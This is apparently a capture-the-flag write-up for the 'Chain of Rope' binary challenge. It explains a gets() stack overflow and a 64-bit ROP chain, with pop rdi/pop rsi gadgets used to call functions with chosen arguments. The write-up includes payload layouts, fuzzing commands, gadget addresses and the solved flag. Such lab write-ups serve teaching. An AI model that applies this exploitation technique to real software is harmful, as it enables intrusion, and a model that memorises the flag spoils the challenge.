# Chain of Rope
Binary

## Challenge 

defund found out about this cool new dark web browser! While he was browsing the dark web he came across this service that sells rope chains on the black market, but they're super overpriced! He managed to get the source code. Can you get him a rope chain without paying?

/problems/2019/chain_of_rope/

nc shell.actf.co 19400

Author: Aplet123

[chain_of_rope](chain_of_rope)

[chain_of_rope.c](chain_of_rope.c)

## Solution

Vulnerable gets() inside the main() function.

Fuzzing, we successfully returned to getInfo() with an offset of 48

    # for i in {1..100}; do echo $i; python -c "from pwn import *; print '1'; print cyclic($i) + p64(0x401256)" | ./chain_of_rope; done 

    48
    --== ROPE CHAIN BLACK MARKET ==--
    LIMITED TIME OFFER: Sending free flag along with any purchase.
    What would you like to do?
    1 - Set name
    2 - Get user info
    3 - Grant access
    Token: 0x0
    Balance: 0x0
    Segmentation fault

To get flag, we must have the following

1. call authorize(void)
2. call addBalance(0xdeadbeef)
3. call flag(0xba5eba11, 0xbedabb1e)


### My initial plan

Hence we will return to main() 3 times and also inject the payload 3 times.

This will be our payload.

    1. call authorize(void)
        payload =  [addr of authorize]
        payload += [addr of main]

    2. call addBalance(0xdeadbeef)
        payload =  [addr of addBalance]
        payload += [addr of main]
        payload += [param1 of 0xdeadbeef]

    3. call flag(0xba5eba11, 0xbedabb1e)
        payload =  [addr of flag]
        payload += [addr of main]
        payload += [param1 of 0xba5eba11]
        payload += [param2 of 0xbedabb1e]


Unfortunately, no matter how much I tried, I can never get the addBalance(0xdeadbeef) to be called successfully...

    # python payload.py 
    [+] Starting local process './chain_of_rope': pid 58799
    [+] Parsing corefile...: Done
    [*] '/FILES/core'
        Arch:      amd64-64-little
        RIP:       0xdeadbeef
        RSP:       0x7ffe83cdd8e8
        Exe:       '/FILES/chain_of_rope' (0x401000)
        Fault:     0xdeadbeef
    --== ROPE CHAIN BLACK MARKET ==--
    LIMITED TIME OFFER: Sending free flag along with any purchase.
    What would you like to do?
    1 - Set name
    2 - Get user info
    3 - Grant access

    ACCESS DENIED

    Token: 0x1337

    Balance: 0x0


### 64-bit binary

Now this is where I noticed it is a 64-bit binary file.

- https://tuonilabs.wordpress.com/2018/07/31/rop-write-ups/
- https://ctf101.org/binary-exploitation/return-oriented-programming/#64-bit
- https://sidsbits.com/Defeating-ASLR-with-a-Leak/
- https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
- https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64

> In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in calling conventions, arguments are passed in registers in 64-bit programs. 

> The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9.


Hence, we need to pop the argument into RDI first before calling the function.

### Revised plan

So now this is out revised payload.

    1. call authorize(void)
        payload += [addr of authorize]

    2. call addBalance(0xdeadbeef)
        payload += [addr of pop_rdi]      # param1
        payload += [param1 of 0xdeadbeef] # param1
        payload += [addr of addBalance]

    3. call flag(0xba5eba11, 0xbedabb1e)
        payload += [addr of pop_rdi]      # param1
        payload += [param1 of 0xba5eba11] # param1
        payload += [addr of pop_rsi]      # param2
        payload += [param2 of 0xbedabb1e] # param2
        payload =  [addr of flag]

For the pop gadgets, we can use ROPGadget to retrieve the addresses


    # ROPgadget --binary ./chain_of_rope | grep 'pop rdi'
    0x0000000000401403 : pop rdi ; ret

    # ROPgadget --binary ./chain_of_rope | grep 'pop rsi'
    0x0000000000401401 : pop rsi ; pop r15 ; ret

Unfortunately, the `pop rsi` also contains a `pop r15`, so we need to have a dummy address inserted too.

Putting it all together into a pwntools script, we get the flag

    # python payload.py 
    [+] Opening connection to shell.actf.co on port 19400: Done
    --== ROPE CHAIN BLACK MARKET ==--
    LIMITED TIME OFFER: Sending free flag along with any purchase.
    What would you like to do?
    1 - Set name
    2 - Get user info
    3 - Grant access

    Authenticated to purchase rope chain, sending free flag along with purchase...
    actf{dark_web_bargains}--== ROPE CHAIN BLACK MARKET ==--
    LIMITED TIME OFFER: Sending free flag along with any purchase.
    What would you like to do?
    1 - Set name
    2 - Get user info
    3 - Grant access

## Flag

    actf{dark_web_bargains}
